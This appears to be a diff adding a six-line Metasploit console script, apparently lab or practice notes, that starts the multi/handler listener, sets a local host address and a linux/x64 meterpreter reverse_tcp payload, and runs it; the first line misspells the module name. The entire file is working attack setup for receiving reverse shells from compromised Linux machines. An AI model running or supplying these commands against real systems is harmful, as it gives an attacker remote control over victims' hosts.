@@ -1,0 +1,6 @@
+use exploit/multi/hanlder
+use exploit/multi/handler
+options
+set lhost 192.168.198.132
+set payload linux/x64/meterpreter/reverse_tcp
+run
